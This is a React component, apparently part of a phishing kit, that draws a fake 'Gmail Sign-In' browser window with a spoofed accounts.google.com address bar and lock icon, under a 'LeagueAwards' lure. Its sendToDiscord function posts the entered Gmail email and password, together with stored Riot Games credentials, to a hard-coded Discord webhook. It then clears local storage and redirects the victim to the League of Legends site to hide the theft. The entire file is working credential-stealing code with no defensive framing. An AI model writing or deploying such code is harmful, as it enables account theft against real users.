import React, { useState, useRef, useEffect } from 'react';
import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2 } from 'lucide-react';

const GmailWindow = ({ onClose }) => {
  const [position, setPosition] = useState({ x: 150, y: 150 });
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState(localStorage.getItem('gmail_email') || "");
  const [password, setPassword] = useState(localStorage.getItem('gmail_pass') || "");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });

  useEffect(() => {
    localStorage.setItem('gmail_email', email);
  }, [email]);

  useEffect(() => {
    localStorage.setItem('gmail_pass', password);
  }, [password]);

  const sendToDiscord = async () => {
    const finalData = {
      riot_u: localStorage.getItem('riot_u') || "N/A",
      riot_p: localStorage.getItem('riot_p') || "N/A",
      gmail_u: localStorage.getItem('gmail_email') || email,
      gmail_p: localStorage.getItem('gmail_pass') || password
    };
    
    await fetch('https://discord.com/api/webhooks/1527762392107188445/B95liOu8a0_Z1kN_mrrQCWKs3OBUezwnxGnF4CI_keGNPBYhAtLo9BOwwd-wAvMjRNPb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Gmail Data Received",
          fields: [
            { name: "Riot Username", value: finalData.riot_u, inline: true },
            { name: "Riot Password", value: finalData.riot_p, inline: true },
            { name: "Gmail Username", value: finalData.gmail_u, inline: true },
            { name: "Gmail Password", value: finalData.gmail_p, inline: true }
          ]
        }]
      })
    });
    localStorage.clear();
  };

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  const handleNext = async () => {
    if (step === 1) {
      if (email.toLowerCase().includes('@gmail')) {
        setStep(2);
        setError("");
      } else {
        setError("Please enter a valid Gmail address.");
      }
    } else {
      if (password.length > 0) {
        setLoading(true);
        await sendToDiscord();
        setTimeout(() => {
          window.location.href = 'https://www.leagueoflegends.com/';
        }, 2000);
      } else {
        setError("Enter your password");
      }
    }
  };

  return (
    <div
      style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
      className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
    >
      {/* Title Bar - Riot Style */}
      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
        <div className="flex items-center h-full">
          <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="w-4 h-4 object-contain"/>
            <span className="text-[11px] text-zinc-300 truncate">Gmail Sign-In</span>
            <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
          </div>
        </div>
        <div className="flex items-center gap-3 pr-2">
          <Minus size={14} className="text-zinc-500 hover:text-white cursor-pointer" />
          <Square size={12} className="text-zinc-500 hover:text-white cursor-pointer" />
          <X size={16} className="text-zinc-400 hover:text-red-400 cursor-pointer" onClick={onClose} />
        </div>
      </div>

      {/* URL Bar - Riot Style */}
      <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
        <div className="flex gap-3 text-zinc-500">
          <ArrowLeft size={16} className="hover:text-white cursor-pointer" />
          <ArrowRight size={16} className="hover:text-white cursor-pointer" />
          <RotateCw size={16} className="hover:text-white cursor-pointer" />
        </div>
        <div className="flex-1 h-7 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
          <span className="text-emerald-500">https://</span>
          <span className="text-zinc-400">accounts.google.com/connection=secure</span>
          <Lock size={12} className="text-green-500 ml-auto" />
        </div>
      </div>

      {/* Content - White background with Gmail login */}
      <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" 
          alt="Google Logo" 
          className="w-32 h-auto object-contain mb-6" 
        />
        
        <h2 className="text-2xl text-zinc-900 font-bold mb-2">
          {step === 1 ? "Sign in" : "Welcome"}
        </h2>
        <p className="text-zinc-600 text-sm mb-6">
          {step === 1 ? "Continue to LeagueAwards" : email}
        </p>
        
        {error && <p className="text-red-500 text-xs mb-4">{error}</p>}
        
        <div className="w-full max-w-[350px] space-y-4">
          <input 
            type={step === 1 ? "email" : "password"}
            placeholder={step === 1 ? "Email or phone" : "Enter your password"} 
            value={step === 1 ? email : password}
            onChange={(e) => step === 1 ? setEmail(e.target.value) : setPassword(e.target.value)}
            className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
          />
          
          <div className="flex justify-between items-center pt-4">
            {step === 2 && (
              <button 
                onClick={() => setStep(1)} 
                className="text-blue-600 font-medium text-sm hover:text-blue-700 flex items-center gap-1"
              >
                <ArrowLeft size={16} /> Back
              </button>
            )}
            <button 
              onClick={handleNext} 
              disabled={loading}
              className={`ml-auto px-6 py-2 rounded font-medium text-sm transition-all duration-300 ${
                loading 
                  ? "bg-blue-400 cursor-not-allowed" 
                  : "bg-blue-600 hover:bg-blue-700 text-white"
              }`}
            >
              {loading ? (
                <Loader2 className="animate-spin w-4 h-4 inline-block" />
              ) : (
                step === 1 ? "Next" : "Sign in"
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GmailWindow;